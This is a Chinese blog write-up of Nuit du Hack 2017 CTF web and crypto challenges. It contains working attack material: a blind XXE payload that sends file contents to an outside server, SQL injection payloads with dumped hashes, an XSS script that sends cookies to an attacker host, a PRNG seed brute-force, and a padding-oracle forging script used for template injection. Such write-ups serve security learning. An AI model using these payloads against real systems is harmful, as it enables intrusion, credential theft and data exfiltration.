<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html lang="zh-CN">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
<title>Bendawang's Site</title>
<link href="./Nuit-du-hack-2017-web-and-crypto-Writeup/font-awesome.min.css" rel="stylesheet"/>
<link href="./Nuit-du-hack-2017-web-and-crypto-Writeup/screen.css" rel="stylesheet"/>
<link href="./Nuit-du-hack-2017-web-and-crypto-Writeup/prism_okaidia.css" rel="stylesheet"/>
<link href="./Nuit-du-hack-2017-web-and-crypto-Writeup/bendawang.css" rel="stylesheet"/>
<script src="./Nuit-du-hack-2017-web-and-crypto-Writeup/jquery.min.js"></script>
</head>
<body class="wrap">
<header>
<nav class="mobile-nav show-on-mobiles">
<ul>
<li class="">
<a href="/index">归档</a></li>
<li class="">
<a href="/time">时间</a></li>
<!--<li class="">
            <a href="/category">标签</a></li>-->
<li class="">
<a href="/friendlink">友链</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
<div class="show-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img src="./Nuit-du-hack-2017-web-and-crypto-Writeup/bendawang.png" style="display:block;width:100%;"/></a>
</h1>
</div>
<div class="grid hide-on-mobiles">
<div class="unit test2 hide-on-mobiles">
<h1>
<a href="/">
<span>Bendawang</span>
<img alt="" height="115" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/bendawang.png" width="449"/></a>
</h1>
</div>
<nav class="main-nav unit test1 hide-on-mobiles">
<ul>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li></li><li></li><li></li><li></li><li></li>
<li class="">
<a href="/index">归档</a></li>
<li class="">
<a href="/time">时间</a></li>
<!--<li class="">
            <a href="/category">标签</a></li>-->
<li class="">
<a href="/friendlink">友链</a></li>
<li class="">
<a href="/about">about</a></li>
</ul>
</nav>
</div>
</header>
<script>
$('document').ready(function(){
    $('li[class]:eq(4)').attr('class','current');
});
</script>
<section class="docs">
<div class="grid">
<!--移动端-->
<div class="show-on-mobiles">
<div class="article-info profile-block">
<div class="article-info-block">
               55
               <span>文章</span>
</div>
<div class="article-info-block">
               5
               <span>标签</span>
</div>
</div>
<div class="profile-block social-links">
<table>
<tbody><tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i></a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i></a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i></a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody></table>
</div>
<div class="whole show-on-mobiles">
<article class="bdw_article">
<div class="Bendawang" id="Bendawang_mobile">
<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
<div class="Bendawang_content" id="Bendawang_content_mobile"></div>

<br/>
<br/>
<h1 id="nuitduhack2017webandcryptowriteup">Nuit du hack 2017 web and crypto Writeup</h1>
<p style="max-width:100%;height:auto;">眼看着三月份过完了，第一次感觉这个月打了好多比赛啊，完全没有足够的时间让我静下来好好学点知识，几次比赛打下来，还是发现自己很多很多问题，很多基础知识打得不牢靠，另外也有很多东西想学，好几场的比赛加上复习四月初的考试，真是报警了，明显感觉自己开始有点浮躁了，状态不行。等四月份考完试，静下来认真学点东西。</p>
<h2 id="web75nopainnogain">web-75 No Pain No Gain</h2>
<p style="max-width:100%;height:auto;">进去发现是一个上传页面，上传csv，进行转换，fuzz时候得到过这样的错误
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfda03cfc1e2451600000b.png" style="max-width:100%;height:auto;"/><br/>
所以猜测是xxe，
然后尝试一波之后没有想法，一直都报错，后来才知道，报错是没关系的，因为已经执行了，所以是一个<code style="max-width:100%;height:auto;">blind xxe</code>
我之前学习xxe的时候也做了笔记，传送门：<code style="max-width:100%;height:auto;">http://bendawang.site/article/XXE-Injection%E7%AC%94%E8%AE%B0</code>，</p>
<p style="max-width:100%;height:auto;">然后直接用里面的payload改一该就好了，这里我们一般不读<code style="max-width:100%;height:auto;">/etc/passwd</code>,一般读<code style="max-width:100%;height:auto;">/etc/hosts</code>，提交的文件内容如下：</p>
<pre><code class="xml language-xml" style="max-width:100%;height:auto;">&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hosts"&gt;&lt;!ENTITY % xxe SYSTEM "http://104.160.43.154:8000/evil.dtd"&gt; %xxe;%send; ]&gt;
&lt;!-- Invitations --&gt;
id,name,email
</code></pre>
<p style="max-width:100%;height:auto;">然后vps上的evil.dtd内容如下：</p>
<pre><code class="xml language-xml" style="max-width:100%;height:auto;">&lt;!ENTITY % all
"&lt;!ENTITY &amp;#x25; send SYSTEM &amp;apos;http://104.160.43.154:8000/xss/?file=%file;&amp;apos;&gt;"
&gt;
%all;
</code></pre>
<p style="max-width:100%;height:auto;">成功获取到hosts的内容，那么开始寻找<code style="max-width:100%;height:auto;">flag</code>，找到死都没找到，最后蛋总说是在<code style="max-width:100%;height:auto;">/home/flag/flag</code>里面，除了伏地膜之外我还能干啥...orz.....
最后截图如下：
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfdc74cfc1e2451600000c.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web100slumdogmillionaire">web-100 Slumdog Millionaire</h2>
<p style="max-width:100%;height:auto;">从题目获取代码如下：</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;">#!/usr/bin/python2.7

import random

import config
import utils


random.seed(utils.get_pid())
ngames = 0


def generate_combination():
    numbers = ""
    for _ in range(10):
        rand_num = random.randint(0, 99)
        if rand_num &lt; 10:
            numbers += "0"
        numbers += str(rand_num)
        if _ != 9:
            numbers += "-"
    return numbers


def reset_jackpot():
    random.seed(utils.get_pid())
    utils.set_jackpot(0)
    ngames = 0


def draw(user_guess):
    ngames += 1
    if ngames &gt; config.MAX_TRIES:
        reset_jackpot()
    winning_combination = generate_combination()
    if winning_combination == user_guess:
        utils.win()
        reset_jackpot()
</code></pre>
<p style="max-width:100%;height:auto;">查看之后发现很简单，要是我们知道了<code style="max-width:100%;height:auto;">seed</code>即那个进程的pid，那么就能预测所有的组合，所以先在网页随便输入一串东西，然后得到第一次的正确答案，这里我得到的是<code style="max-width:100%;height:auto;">56-08-50-98-94-51-01-75-63-61</code>
然后运行如下代码就好了</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;">import random

def generate_combination():
    numbers = ""
    for _ in range(10):
        rand_num = random.randint(0, 99)
        if rand_num &lt; 10:
            numbers += "0"
        numbers += str(rand_num)
        if _ != 9:
            numbers += "-"
    return numbers
seed=0
for i in xrange(1,10000):
    random.seed(i)
    ret = generate_combination()
    print ret
    if (ret == &amp;apos;56-08-50-98-94-51-01-75-63-61&amp;apos;):
        print &amp;apos;find&amp;apos;,i
        seed=i
        break
random.seed(seed)
ans=generate_combination()
ans=generate_combination()
print ans
</code></pre>
<p style="max-width:100%;height:auto;">得到ans提交就拿到flag了
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfabfecfc1e24516000000.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web120divideandrule">web-120 Divide and rule</h2>
<p style="max-width:100%;height:auto;">首先点进去是个登陆页面，
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfac6ccfc1e24516000002.png" style="max-width:100%;height:auto;"/><br/>
然后去<code style="max-width:100%;height:auto;">search</code>那儿找东西
发现那一堆查询参数是存在注入的，随便加个单引号就不返回值了。
然后尝试联合查询发现还是不返回，后来想到这么多参数很可能是长度受了限制，然后就分开来，最后测试成功，如下：</p>
<pre><code class="sql language-sql" style="max-width:100%;height:auto;">firstname=&amp;apos;union select/*&amp;lastname=*/1,2,3,4,5,6#&amp;position=&amp;country=123&amp;gender=
</code></pre>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfad33cfc1e24516000003.png" style="max-width:100%;height:auto;"/><br/>
但是有一个问题就是，长度限制后来测出来好像是15，这样子没办法查表名和列名之类的，因为<code style="max-width:100%;height:auto;">information_schema</code>太长了。
后来脑洞了一下猜到表名是<code style="max-width:100%;height:auto;">users</code>，
然后根据初始登录页面的name猜到字段名分别是<code style="max-width:100%;height:auto;">login</code>和<code style="max-width:100%;height:auto;">password</code></p>
<pre><code class="sql language-sql" style="max-width:100%;height:auto;">firstname=&amp;apos;union select/*&amp;lastname=*/login/*&amp;position=*/,2,3,4,5,6 /*#&amp;country=*/from users#123&amp;gender=

firstname=&amp;apos;union select/*&amp;lastname=*/password/*&amp;position=*/,2,3,4,5,6 /*#&amp;country=*/from users#123&amp;gender=
</code></pre>
<p style="max-width:100%;height:auto;">得到三个用户名和三个md5的密码值，MD5解密之后登陆就拿到flag了</p>
<pre><code style="max-width:100%;height:auto;">#三个用户名
ruleradmin
patrick
raoul

#三个密码
04fc95a5debc7474a84fad9c50a1035d #smart1985
db6eab0550da4b056d1a33ba2e8ced66 #1badgurl
7ac89e3c1f1a71ee19374d7e8912714b #1badboy
</code></pre>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfae16cfc1e24516000004.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web200purplepossemarket">web-200 Purple Posse Market</h2>
<p style="max-width:100%;height:auto;">进去之后研究半天，发现有一个contact页面可以提交一些东西，然后其他好像也没有太多用，题目描述让拿到管理员的IBAN账户。那多半是xss拿到cookie登陆后台了，然后在评论这里尝试提交，发现根本没有过滤，下面代码直接就能返回</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;script src="http://你的xss平台"&gt;&lt;/script&gt;
</code></pre>
<p style="max-width:100%;height:auto;">刚开始做的时候bot巨慢无比。。10多分钟才打回来知道没有过滤，白白浪费我半天，后来突然就变快了。。。僵硬。。
回到题目，既然没有过滤，那么直接执行js就好了，提交如下：</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;script src="http://你的网址/requests.js"&gt;&lt;/script&gt;
</code></pre>
<p style="max-width:100%;height:auto;">然后这个<code style="max-width:100%;height:auto;">request.js</code>这样写的</p>
<pre><code class="js language-js" style="max-width:100%;height:auto;">$.get("http://你的xss平台?a="+document.cookie,function(data,status){})
</code></pre>
<p style="max-width:100%;height:auto;">截图如下：
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfaf91cfc1e24516000005.png" style="max-width:100%;height:auto;"/><br/>
登陆进去就能看到IBAN账户，这就是flag了。</p>
<h2 id="web250whyunoknock">web-250 WhyUNoKnock</h2>
<h2 id="crypto250markisfaillingdowndrunk">crypto-250 MarkIsFaillingDownDrunk</h2>
<p style="max-width:100%;height:auto;">进去之后随便点一个，发现链接变成这个</p>
<pre><code style="max-width:100%;height:auto;">http://markisfaillingdowndrunk.quals.nuitduhack.com/view/deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02
</code></pre>
<p style="max-width:100%;height:auto;">这一看都不用想，80%是<code style="max-width:100%;height:auto;">padding oracle</code>，
然后开始写代码，先把他的几串东西的明文搞出来，代码如下：</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
import base64
import time
url=&amp;apos;http://markisfaillingdowndrunk.quals.nuitduhack.com/view/&amp;apos;
N=16
phpsession=""
ID=""
def inject(param):
    result=requests.get(url+param)
    #print result.content
    return result

def xor(a, b):
    print "length",len(a),len(b)
    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])

def pad(string,N):
    l=len(string)
    if l!=N:
        return string+chr(N-l)*(N-l)

def padding_oracle(N,cipher): ##return middle
    get=""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding=xor(get,chr(i)*(i-1))
            c=chr(0)*(16-i)+chr(j)+padding+cipher
            print c.encode(&amp;apos;hex&amp;apos;)
            result=inject(c.encode(&amp;apos;hex&amp;apos;))
            if result.status_code!=500:
                print j
                get=chr(j^i)+get
                break
    return get
s=["deadbeefcafedeadbeefcafe04030201b2c7da6ca163321fc0e96e98df20b58389e055de04be2972edc654d2f609d9608bc083bf5f35eba62d7faf73d7ec7fec88743a46bbd5711e9f954f7f54c211a3ef30067df218e84a474ec00dc1789b3c053fd578c86f6e87e080a63c6191289cd4f2e5178882f36097ae40214323b2bde2491de75c6603a708b61f80efc07b2da2d626137891b74c7019b040db51f468a2d6978e726e5c35ad9ce7f1dbc06cba",
"deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf441aee00f376a598270a8d830ddf58ab489e053dbbfba4b30652f718567777364a07d5b453fb6ab946cc6ce6485f6250d583fbaac9fb0d169de6184a1c1fa0a30",
"deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65",
"deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02"]
IV=s[0][:16]
#str4
ans=[]
for i in xrange(4):
    c=[]
    str1=s[i].decode(&amp;apos;hex&amp;apos;)
    #print s[i]
    #print str1
    for j in xrange(0,len(str1),N):
        c.append(str1[j:j+N])
    l=len(c)
    print l
    p=[""]*l
    for j in xrange(l-1,0,-1):
        middle=padding_oracle(N,c[j])
        print "========================middle================================"
        print j
        print middle.encode(&amp;apos;hex&amp;apos;)
        p[j]=xor(middle,c[j-1])
        print p[j]
    print "==========================plain==============================="
    print i
    print p
    ans.append(p)
print ans
</code></pre>
<p style="max-width:100%;height:auto;">服务器真是慢的我想日狗了，做了那么多<code style="max-width:100%;height:auto;">padding oracle</code>，从来没有遇到这么慢的服务器好吧。。。平均一个一分钟，一组就是16分钟，光跑第一串出来就用了n久。。。
然后我是开了两个程序顺序反序一起跑，把第一串和第四串跑出来是个这样的东西，</p>
<pre><code class="url language-url" style="max-width:100%;height:auto;">1：https://gist.githubusercontent.com/MarkIsFaillingDownDrunk/b9ed0141c97ae6488379dafa088c04d2/raw/4129795e82bb978e78b00bcb9b9fc4b6acb44898/test.md\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10

4：https://raw.githubusercontent.com/dlitz/pycrypto/master/README\x02\x02
</code></pre>
<p style="max-width:100%;height:auto;">访问一下，内容是这个</p>
<pre><code class="markdown language-markdown" style="max-width:100%;height:auto;"># Welcome to MarkParser !
## This is a simple Markdown test.

Test for dynamic rendering :

[{{ config[&amp;apos;WEBSITE_NAME&amp;apos;] }}](/)
</code></pre>
<p style="max-width:100%;height:auto;">再看看它网页的内容
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfb189cfc1e24516000006.png" style="max-width:100%;height:auto;"/><br/>
这样就很明白了，
也就是说他的<code style="max-width:100%;height:auto;">view</code>后面直接跟的链接。他会读取链接的内容，然后进行<code style="max-width:100%;height:auto;">markdown</code>转换，然后在进行模板渲染。
所以接下来的思路也就很明确很简单了，让它访问我们的网站预先放好的<code style="max-width:100%;height:auto;">md</code>，然后就是个<code style="max-width:100%;height:auto;">ssti</code>了，通过一些奇怪姿势找到执行命令或是读取文件的函数就行了。
这里由于有了第四个链接，所以我构造一个目录如下：</p>
<pre><code class="bash language-bash" style="max-width:100%;height:auto;">第四个密文对应明文: https://raw.githubusercontent.com/dlitz/pycrypto/master/README\x02\x02
我的网页          : http://104.160.43.154:8000/xxxxxxxxxxxxxxxxxxxxx/master/README\x02\x02
</code></pre>
<p style="max-width:100%;height:auto;">最后一组明文和他密文解密出来的一样，这样我就可以维持最后一个分组密文以及倒数第二个分组的密文不变了。然后依次通过<code style="max-width:100%;height:auto;">padding oracle</code>获取中间值，与构造的密文异或得到构造的密文，从而得到我的网址对应的密文
至于具体<code style="max-width:100%;height:auto;">padding oracle</code>伪造明文的原理这里不赘述了，可以去看我之前的博客或是直接私聊我。
代码如下：</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
import base64
import time
url=&amp;apos;http://markisfaillingdowndrunk.quals.nuitduhack.com/view/&amp;apos;
N=16
phpsession=""
ID=""
def inject(param):
    result=requests.get(url+param)
    #print result.content
    return result

def xor(a, b):
    print "length",len(a),len(b)
    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])

def pad(string,N):
    l=len(string)
    if l!=N:
        return string+chr(N-l)*(N-l)

def padding_oracle(N,cipher): ##return middle
    get=""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding=xor(get,chr(i)*(i-1))
            c=chr(0)*(16-i)+chr(j)+padding+cipher
            print c.encode(&amp;apos;hex&amp;apos;)
            result=inject(c.encode(&amp;apos;hex&amp;apos;))
            if result.status_code!=500:
                print j
                get=chr(j^i)+get
                break
    return get
&amp;apos;&amp;apos;&amp;apos;
s=["deadbeefcafedeadbeefcafe04030201b2c7da6ca163321fc0e96e98df20b58389e055de04be2972edc654d2f609d9608bc083bf5f35eba62d7faf73d7ec7fec88743a46bbd5711e9f954f7f54c211a3ef30067df218e84a474ec00dc1789b3c053fd578c86f6e87e080a63c6191289cd4f2e5178882f36097ae40214323b2bde2491de75c6603a708b61f80efc07b2da2d626137891b74c7019b040db51f468a2d6978e726e5c35ad9ce7f1dbc06cba",
"deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf441aee00f376a598270a8d830ddf58ab489e053dbbfba4b30652f718567777364a07d5b453fb6ab946cc6ce6485f6250d583fbaac9fb0d169de6184a1c1fa0a30",
"deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65",
"deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02"]
IV=s[0][:16]
#str4
ans=[]
for i in xrange(4):
    c=[]
    str1=s[i].decode(&amp;apos;hex&amp;apos;)
    #print s[i]
    #print str1
    for j in xrange(0,len(str1),N):
        c.append(str1[j:j+N])
    l=len(c)
    print l
    p=[""]*l
    for j in xrange(l-1,0,-1):
        middle=padding_oracle(N,c[j])
        print "========================middle================================"
        print j
        print middle.encode(&amp;apos;hex&amp;apos;)
        p[j]=xor(middle,c[j-1])
        print p[j]
    print "==========================plain==============================="
    print i
    print p
    ans.append(p)
print ans
&amp;apos;&amp;apos;&amp;apos;


&amp;apos;&amp;apos;&amp;apos;
1    :   https://gist.githubusercontent.com/MarkIsFaillingDownDrunk/b9ed0141c97ae6488379dafa088c04d2/raw/4129795e82bb978e78b00bcb9b9fc4b6acb44898/test.md\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10
2    :
3    :
4    :   https://raw.githubusercontent.com/dlitz/pycrypto/master/README\x02\x02
myans:   http://104.160.43.154:8000/xxxxxxxxxxxxxxxxxxxxx/master/README\x02\x02

&amp;apos;&amp;apos;&amp;apos;

cipher=[
        "deadbeefcafedeadbeefcafe04030201",
        "52208110d1a06ce628ff8e10f4cbc1aa",
        "96ac276f57b6d80e50df1050c455fdf4",
        "40d56ae51399ceb30b5b69153ddc2302",
        "19e3f662023665e8885c90867b8c3a02"
        ]
middle=[
        &amp;apos;b6d9ca9fb9c4f182cc8ebdd0636a7669&amp;apos;,
        &amp;apos;2742f463b4d20f89468beb7e80e5a2c5&amp;apos;,
        &amp;apos;fb8343033ec2a22120a67322bd25899b&amp;apos;,
        &amp;apos;6fb80b9667fcbc9c591e285170992100&amp;apos;
        ]
ans   =[
        "http://104.160.4",
        "3.154:8000/xxxxx",
        "xxxxxxxxxxxxxxxx",
        "/master/README\x02\x02"
       ]

tmp_ans=[""]*5

tmp_ans[4]=cipher[4]
tmp_ans[3]=cipher[3]
tmp_middle=middle[2].decode(&amp;apos;hex&amp;apos;)
tmp_ans[2]=xor(ans[2],tmp_middle).encode("hex")

tmp_middle=padding_oracle(N,tmp_ans[2].decode("hex"))
print tmp_middle.encode(&amp;apos;hex&amp;apos;)   #"9d41e1434f05be3bea284b8d2eb8928b".decode(&amp;apos;hex&amp;apos;)

tmp_ans[1]=xor(ans[1],tmp_middle).encode("hex")
tmp_middle=padding_oracle(N,tmp_ans[1].decode("hex"))
print tmp_middle.encode(&amp;apos;hex&amp;apos;)   #"c05b49fef1d14b17aa0dd98a591ea57f".decode(&amp;apos;hex&amp;apos;)

tmp_ans[0]=xor(ans[0],tmp_middle).encode("hex")
view="".join(i for i in tmp_ans)
print view
#a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02
</code></pre>
<p style="max-width:100%;height:auto;">通过上述代码，我得到我的这个链接<code style="max-width:100%;height:auto;">http://104.160.43.154:8000/xxxxxxxxxxxxxxxxxxxxx/master/README</code>对应的密文是</p>
<pre><code style="max-width:100%;height:auto;">a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02
</code></pre>
<p style="max-width:100%;height:auto;">然后我修改我的网站的<code style="max-width:100%;height:auto;">README</code>的内容为
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfb47acfc1e24516000007.png" style="max-width:100%;height:auto;"/><br/>
注意下我的这个内容外面包了两个反撇号，因为我们刚才说了，他会读取链接的内容，然后进行<code style="max-width:100%;height:auto;">markdown</code>转换，然后在进行模板渲染。<code style="max-width:100%;height:auto;">markdown</code>，转换在先，很多我们需要用的符号在<code style="max-width:100%;height:auto;">markdown</code>里面都有特殊语义会被转换，加上这两个反撇号就好了。
然后尝试访问</p>
<pre><code style="max-width:100%;height:auto;">http://markisfaillingdowndrunk.quals.nuitduhack.com/view/a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02
</code></pre>
<p style="max-width:100%;height:auto;">结果如下：
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfb502cfc1e24516000008.png" style="max-width:100%;height:auto;"/><br/>
成功了，
好的，接下来就找出<code style="max-width:100%;height:auto;">SSTI</code>的payload执行一波命令，发现失败了，经过一番测试才知道题目用的环境是<code style="max-width:100%;height:auto;">python3</code>，而平时做的题目之类的都是<code style="max-width:100%;height:auto;">python2</code>，那么开始在python3下面寻找姿势。
找了n久n久，终于找到了
最后<code style="max-width:100%;height:auto;">payload</code>如下：
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfb5a0cfc1e24516000009.png" style="max-width:100%;height:auto;"/><br/>
直接访问得到flag如下：
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfb5bacfc1e2451600000a.png" style="max-width:100%;height:auto;"/><br/></p>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>



<!--PC端-->
<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
<div class="inner profile-inner">
<div class="base-info profile-block">
<img id="avatar" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/logo.jpg"/>
<h2 id="name" style="text-align:center">Bendawang</h2>
<span id="location" style="font-size:18px">
<i class="fa fa-map-marker"></i>SiChuan, China</span>
<a href="/about" id="follow">联系我</a></div>
<div class="article-info profile-block">
<div class="article-info-block">
        55
          <span>文章</span></div>
<div class="article-info-block">
        5
          <span>标签</span></div>
</div>
<div class="profile-block social-links hide-on-mobiles">
<table>
<tbody>
<tr>
<td>
<a href="https://github.com/530393297" target="_blank" title="github">
<i class="fa fa-github"></i>
</a>
</td>
<td>
<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
<i class="fa fa-qq"></i>
</a>
</td>
<td>
<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
<i class="fa fa-weibo"></i>
</a>
</td>
<td>
<a href="http://bendawang.site/rss" target="_blank" title="rss">
<i class="fa fa-rss-square"></i></a>
</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
<div class="unit three-quarters hide-on-mobiles">
<article class="bdw_article">
<h1 id="nuitduhack2017webandcryptowriteup">Nuit du hack 2017 web and crypto Writeup</h1>
<p style="max-width:100%;height:auto;">眼看着三月份过完了，第一次感觉这个月打了好多比赛啊，完全没有足够的时间让我静下来好好学点知识，几次比赛打下来，还是发现自己很多很多问题，很多基础知识打得不牢靠，另外也有很多东西想学，好几场的比赛加上复习四月初的考试，真是报警了，明显感觉自己开始有点浮躁了，状态不行。等四月份考完试，静下来认真学点东西。</p>
<h2 id="web75nopainnogain">web-75 No Pain No Gain</h2>
<p style="max-width:100%;height:auto;">进去发现是一个上传页面，上传csv，进行转换，fuzz时候得到过这样的错误
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfda03cfc1e2451600000b.png" style="max-width:100%;height:auto;"/><br/>
所以猜测是xxe，
然后尝试一波之后没有想法，一直都报错，后来才知道，报错是没关系的，因为已经执行了，所以是一个<code style="max-width:100%;height:auto;">blind xxe</code>
我之前学习xxe的时候也做了笔记，传送门：<code style="max-width:100%;height:auto;">http://bendawang.site/article/XXE-Injection%E7%AC%94%E8%AE%B0</code>，</p>
<p style="max-width:100%;height:auto;">然后直接用里面的payload改一该就好了，这里我们一般不读<code style="max-width:100%;height:auto;">/etc/passwd</code>,一般读<code style="max-width:100%;height:auto;">/etc/hosts</code>，提交的文件内容如下：</p>
<pre><code class="xml language-xml" style="max-width:100%;height:auto;">&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hosts"&gt;&lt;!ENTITY % xxe SYSTEM "http://104.160.43.154:8000/evil.dtd"&gt; %xxe;%send; ]&gt;
&lt;!-- Invitations --&gt;
id,name,email
</code></pre>
<p style="max-width:100%;height:auto;">然后vps上的evil.dtd内容如下：</p>
<pre><code class="xml language-xml" style="max-width:100%;height:auto;">&lt;!ENTITY % all
"&lt;!ENTITY &amp;#x25; send SYSTEM &amp;apos;http://104.160.43.154:8000/xss/?file=%file;&amp;apos;&gt;"
&gt;
%all;
</code></pre>
<p style="max-width:100%;height:auto;">成功获取到hosts的内容，那么开始寻找<code style="max-width:100%;height:auto;">flag</code>，找到死都没找到，最后蛋总说是在<code style="max-width:100%;height:auto;">/home/flag/flag</code>里面，除了伏地膜之外我还能干啥...orz.....
最后截图如下：
<br/><img alt="" data-action="zoom" src="./Nuit-du-hack-2017-web-and-crypto-Writeup/58dfdc74cfc1e2451600000c.png" style="max-width:100%;height:auto;"/><br/></p>
<h2 id="web100slumdogmillionaire">web-100 Slumdog Millionaire</h2>
<p style="max-width:100%;height:auto;">从题目获取代码如下：</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;">#!/usr/bin/python2.7

import random

import config
import utils


random.seed(utils.get_pid())
ngames = 0


def generate_combination():
    numbers = ""
    for _ in range(10):
        rand_num = random.randint(0, 99)
        if rand_num &lt; 10:
            numbers += "0"
        numbers += str(rand_num)
        if _ != 9:
            numbers += "-"
    return numbers


def reset_jackpot():
    random.seed(utils.get_pid())
    utils.set_jackpot(0)
    ngames = 0


def draw(user_guess):
    ngames += 1
    if ngames &gt; config.MAX_TRIES:
        reset_jackpot()
    winning_combination = generate_combination()
    if winning_combination == user_guess:
        utils.win()
        reset_jackpot()
</code></pre>
<p style="max-width:100%;height:auto;">查看之后发现很简单，要是我们知道了<code style="max-width:100%;height:auto;">seed</code>即那个进程的pid，那么就能预测所有的组合，所以先在网页随便输入一串东西，然后得到第一次的正确答案，这里我得到的是<code style="max-width:100%;height:auto;">56-08-50-98-94-51-01-75-63-61</code>
然后运行如下代码就好了</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;">import random

def generate_combination():
    numbers = ""
    for _ in range(10):
        rand_num = random.randint(0, 99)
        if rand_num &lt; 10:
            numbers += "0"
        numbers += str(rand_num)
        if _ != 9:
            numbers += "-"
    return numbers
seed=0
for i in xrange(1,10000):
    random.seed(i)
    ret = generate_combination()
    print ret
    if (ret == &amp;apos;56-08-50-98-94-51-01-75-63-61&amp;apos;):
        print &amp;apos;find&amp;apos;,i
        seed=i
        break
random.seed(seed)
ans=generate_combination()
ans=generate_combination()
print ans
</code></pre>
